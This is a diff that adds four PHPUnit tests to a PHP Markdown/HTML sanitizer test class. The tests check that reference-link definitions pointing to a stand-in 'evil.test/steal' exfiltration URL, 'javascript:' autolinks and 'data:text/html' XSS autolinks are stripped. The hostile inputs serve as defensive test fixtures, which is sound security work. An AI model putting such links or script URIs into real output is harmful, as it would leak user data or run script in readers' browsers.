@@ -35,6 +35,38 @@ final class HtmlMarkdownSanitizerTest extends TestCase
         self::assertStringNotContainsString('javascript:', $out);
     }
 
+    public function test_neutralizes_reference_link_definition(): void
+    {
+        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
+            ->sanitize("[exfil][ref]\n[ref]: https://evil.test/steal?d=secret");
+
+        self::assertStringNotContainsString('evil.test', $out);
+    }
+
+    public function test_neutralizes_reference_link_definition_with_title(): void
+    {
+        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: false, neutralizeMarkdown: true))
+            ->sanitize('[ref]: https://evil.test/steal "Title"');
+
+        self::assertStringNotContainsString('evil.test', $out);
+    }
+
+    public function test_neutralizes_javascript_autolink_without_double_slash(): void
+    {
+        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true))
+            ->sanitize('<javascript:alert(1)>');
+
+        self::assertStringNotContainsString('javascript:', $out);
+    }
+
+    public function test_neutralizes_data_uri_autolink(): void
+    {
+        $out = (new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true))
+            ->sanitize('<data:text/html,<h1>xss</h1>>');
+
+        self::assertStringNotContainsString('data:', $out);
+    }
+
     public function test_idempotent_on_plain_text(): void
     {
         $sanitizer = new HtmlMarkdownSanitizer(sanitizeHtml: true, neutralizeMarkdown: true);
